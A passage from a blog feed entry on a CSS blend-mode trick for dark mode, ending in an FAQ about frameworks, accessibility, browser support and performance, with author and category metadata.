style="color:rgb(130, 170, 255)">brightness</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Thanks for reading!</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="faq">FAQ<a class="hash-link" href="#faq" title="Direct link to heading">​</a></h2><p><em>“Many CSS frameworks have a dark-mode, why not use that?”</em>\<!-- -->
Vuetify also has a dark-mode. Most of the components they offer look okay in dark-mode, but we would have
to write custom CSS for our own components, and for other libraries we’re using (primarily for charts).
The great thing about the blend-mode hack is that is operates independently of any framework.
You set it on an HTML tag and it treats everything the same way.</p><p><em>“What about accessibility?”</em>\<!-- -->
Yeah, this isn't great for accessibility. Since we're lowering the brightness to 67% we're losing a lot of contrast.
We increased the font-weight to mitigate the effects of this, but you shouldn't use this technique for your primary theme.</p><p><em>“What about browser support?”</em>\<!-- -->
Supported in modern browsers, except Edge.
There's a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode#Browser_Compatibility" target="_blank" rel="noopener noreferrer">detailed table</a> available on MDN.</p><p><em>“What about performance?”</em>\<!-- -->
We haven't had any problems with performance, but some readers noted that they tried
the trick on a complex website (Jira), which resulted in sluggish behavior.</p>]]></content>
        <author>
            <name>David Åse</name>
            <uri>https://linkedin.com/in/davidaase</uri>
        </author>
        <category label="CSS" term="CSS"/>
        <category label="frontend" term="frontend"/>
        <category label="design" term="design"/>
    </entry>
</feed>